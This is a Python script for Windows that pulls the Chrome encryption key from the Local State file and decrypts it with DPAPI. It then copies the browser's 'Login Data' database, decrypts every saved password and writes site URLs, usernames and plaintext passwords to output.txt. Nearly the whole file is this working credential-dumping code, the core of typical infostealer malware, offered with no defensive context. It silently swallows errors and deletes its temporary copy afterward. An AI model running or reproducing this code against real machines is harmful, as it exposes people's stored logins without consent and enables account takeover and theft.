import os
import json
import base64
import sqlite3
import win32crypt
from Crypto.Cipher import AES
import shutil
from datetime import timezone, datetime, timedelta
import time

def get_chrome_datetime(chromedate):
    return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)

def get_encryption_key():
    local_state_path = os.path.join(os.environ["USERPROFILE"],
                                    "AppData", "Local", "Google", "Chrome",
                                    "User Data", "Local State")
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = f.read()
        local_state = json.loads(local_state)

    # decode the encryption key from Base64
    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    # remove DPAPI str
    key = key[5:]
    # return decrypted key that was originally encrypted
    # using a session key derived from current user's logon credentials

    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

def decrypt_password(password, key):
    try:
        # get the initialization vector
        iv = password[3:15]
        password = password[15:]
        # generate cipher
        cipher = AES.new(key, AES.MODE_GCM, iv)
        # decrypt password
        return cipher.decrypt(password)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            # not supported
            return ""
def get_chrome_password():
    # get the AES key
    #passwords = []
    key = get_encryption_key()
    # local sqlite Chrome database path
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                            "Google", "Chrome", "User Data", "default", "Login Data")
    # copy the file to another location
    # as the database will be locked if chrome is currently running
    filename = "ChromeData.db"
    shutil.copyfile(db_path, filename)
    # connect to the database
    db = sqlite3.connect(filename)
    cursor = db.cursor()
    # `logins` table has the data we need
    cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
    # iterate over all rows
    try:
        with open("output.txt", "w") as f:
            for row in cursor.fetchall():
                origin_url = row[0]
                action_url = row[1]
                username = row[2]
                password = decrypt_password(row[3], key)
                date_created = row[4]
                date_last_used = row[5]
                if username or password:
                    f.write(f'Origin_url: {origin_url}' + "\n")
                    f.write(f'Action_url: {action_url}' + "\n")
                    f.write(f'username: {username}' + "\n")
                    f.write(f'Password: {password}' + "\n")
                else:
                    continue
                if date_created != 86400000000 and date_created:
                    f.write(f"Date Created {str(get_chrome_datetime(date_last_used))}" + "\n")
                    #print(f"Creation date: {str(get_chrome_datetime(date_created))}")
                if date_last_used != 86400000000 and date_last_used:
                    f.write(f'Last used: {str(get_chrome_datetime(date_last_used))}' + "\n")
                    #print(f"Last Used: {str(get_chrome_datetime(date_last_used))}")
                f.write("\n" + "="*50+"\n")
    except Exception as e:
        pass
    cursor.close()
    db.close()
    try:
            # try to remove the copied db file
        os.remove(filename)
    except Exception as e:
        print(e)

if __name__=="__main__":
    get_chrome_password()
